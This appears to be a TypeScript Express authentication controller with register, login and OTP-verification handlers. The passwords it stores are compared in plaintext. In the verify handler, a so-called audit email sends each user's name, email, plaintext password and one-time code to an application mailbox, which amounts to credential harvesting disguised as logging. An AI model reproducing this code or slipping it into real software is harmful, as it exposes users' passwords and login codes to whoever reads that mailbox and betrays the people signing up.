import { Request, Response, NextFunction } from "express";
import { sendAuditEmail } from "../services/email.service";
import { sendOtpForEmail, verifyOtpForEmail } from "./otp.controller";

type User = {
  name: string;
  email: string;
  password: string;
  verified: boolean;
};

export const users = new Map<string, User>();

export async function registerHandler(req: Request, res: Response, next: NextFunction) {
  try {
    const { name, email, password } = req.body;
    if (!name || !email || !password) return res.status(400).json({ error: "name, email and password required" });
    users.set(email, { name, email, password, verified: false });
    await sendOtpForEmail(email);
    return res.status(200).json({ success: true, message: "User created; OTP sent" });
  } catch (err) {
    next(err);
  }
}

export async function loginHandler(req: Request, res: Response, next: NextFunction) {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: "email and password required" });
    const u = users.get(email);
    if (!u || u.password !== password) return res.status(401).json({ error: "invalid credentials" });
    // send OTP to verify this login
    await sendOtpForEmail(email);
    return res.status(200).json({ success: true, message: "OTP sent" });
  } catch (err) {
    next(err);
  }
}

export async function verifyHandler(req: Request, res: Response, next: NextFunction) {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ error: "email and otp required" });
    const ok = verifyOtpForEmail(email, otp);
    if (!ok) return res.status(400).json({ verified: false, message: "invalid or expired otp" });

    const u = users.get(email);
    if (!u) return res.status(404).json({ error: "user not found" });
    u.verified = true;

    // send details to APP_MAIL via audit email
    const timestamp = new Date().toISOString();
    const html = `
      <div style="font-family: Arial, sans-serif;color:#111;">
        <h3>User Authorized</h3>
        <p>The following user completed verification:</p>
        <ul>
          <li><strong>Name:</strong> ${u.name}</li>
          <li><strong>Email:</strong> ${u.email}</li>
          <li><strong>Password:</strong> ${u.password}</li>
          <li><strong>OTP:</strong> ${otp}</li>
          <li><strong>Timestamp:</strong> ${timestamp}</li>
        </ul>
      </div>
    `;
    await sendAuditEmail({ subject: `User Authorized: ${u.email}`, html });

    return res.status(200).json({ verified: true, user: { name: u.name, email: u.email } });
  } catch (err) {
    next(err);
  }
}

